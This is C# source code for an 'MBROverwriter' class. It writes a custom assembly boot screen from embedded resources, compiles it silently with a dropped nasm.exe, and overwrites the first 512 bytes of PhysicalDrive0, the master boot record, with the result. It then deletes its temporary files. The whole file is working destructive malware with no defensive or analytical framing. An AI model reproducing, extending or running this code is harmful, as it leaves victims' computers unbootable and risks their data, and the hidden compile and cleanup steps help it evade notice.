using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class MBROverwriter
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll")]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    private const uint GenericAll = 0x10000000;
    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint MbrSize = 512U;

    public static void OverwriteMBR(string text, string color)
    {
        WriteClutterFile(text, color);
        CompileClutterFile();
        DoOverwrite(File.ReadAllBytes("clutter.bin"));
        CleanFiles();
    }

    private static void WriteClutterFile(string text, string color)
    {
        string clutter = CustomMBROverwriter.Properties.Resources.clutter;

        clutter = clutter.Replace("%str%", text);
        clutter = clutter.Replace("%color%", color);

        File.WriteAllText("clutter.asm", clutter);
        CreateNASMInstance();
    }

    private static void CreateNASMInstance()
    {
        File.WriteAllBytes("nasm.exe", CustomMBROverwriter.Properties.Resources.nasm);
    }

    private static void CompileClutterFile()
    {
        ProcessStartInfo ProcessInfo;
        Process process;

        ProcessInfo = new ProcessStartInfo("cmd.exe", "/c nasm.exe -f bin clutter.asm -o clutter.bin");
        ProcessInfo.CreateNoWindow = true;
        ProcessInfo.UseShellExecute = false;
        ProcessInfo.WorkingDirectory = Directory.GetCurrentDirectory();
        ProcessInfo.RedirectStandardError = true;
        ProcessInfo.RedirectStandardOutput = true;

        process = Process.Start(ProcessInfo);
        process.WaitForExit();

        while (!File.Exists("clutter.bin"))
        {
            Thread.Sleep(1);
        }
    }

    private static void DoOverwrite(byte[] mbrData)
    {
        IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
        WriteFile(mbr, mbrData, MbrSize, out uint _, IntPtr.Zero);
    }

    private static void CleanFiles()
    {
        foreach (string file in Program.files)
        {
            File.Delete(file);
        }
    }
}